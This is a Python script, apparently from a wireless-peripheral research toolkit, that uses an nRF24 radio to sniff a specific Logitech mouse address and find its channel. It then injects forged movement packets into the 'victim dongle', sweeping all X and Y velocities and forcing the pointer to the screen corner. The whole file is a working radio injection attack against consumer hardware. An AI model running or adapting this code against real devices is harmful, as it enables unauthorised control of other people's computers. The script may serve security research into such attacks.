import sys
from os.path import dirname

sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.general_utils import *
from utils.injection_utils import *
from utils.vendors import logitech

# converts a hex string to two's complement integer
def twos_complement(hexstr, bits):
    value = int(hexstr, 16) # returns an unsigned integer
    if value & (1 << (bits - 1)): # if bit n-1 is set, then the number is signed
        value -= 1 << bits # to get the negative number from the positive number, subtract 2^n
    return value

def main():
    mouse_address = address_str_to_bytes("FA:AB:A8:0C:A4")

    # initialize the radio
    radio = nrf24.nrf24()

    radio.enter_sniffer_mode(mouse_address)
    channel = find_frequency_channel(radio)
    if not channel:
        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
        sys.exit(1)

    # lock Y velocity at 0, try all X velocity values
    for i in range(0x1000):
        x = i & 0xFFF # lower 12 bits
        y = i >> 12 # higher 12 bits
        print(f"X velocity = {twos_complement(hex(x), 12)}, Y velocity = {twos_complement(hex(y), 12)}")
        radio.transmit_payload(logitech.with_checksum(payload_str_to_bytes("00:C2:00:00:" + format_bytes(i.to_bytes(3, byteorder='little')) + ":00:00"))) # must be little endian!
        time.sleep(0.01)
    
    # lock X velocity at 0, try all Y velocity values
    for i in range(0, 0x1000000, 0x1000):
        x = i & 0xFFF
        y = i >> 12
        print(f"X velocity = {twos_complement(hex(x), 12)}, Y velocity = {twos_complement(hex(y), 12)}")
        radio.transmit_payload(logitech.with_checksum(payload_str_to_bytes("00:C2:00:00:" + format_bytes(i.to_bytes(3, byteorder='little')) + ":00:00")))
        time.sleep(0.01)

    # force mouse pointer to top-left corner for 100 * 10ms = 1000ms = 1 second
    for i in range(100):
        movement = 0x800800 # fastest negative X and Y velocities
        radio.transmit_payload(logitech.with_checksum(payload_str_to_bytes("00:C2:00:00:" + format_bytes(movement.to_bytes(3, byteorder='little')) + ":00:00")))
        time.sleep(0.01) # 10ms
    
if __name__ == "__main__":
    main()
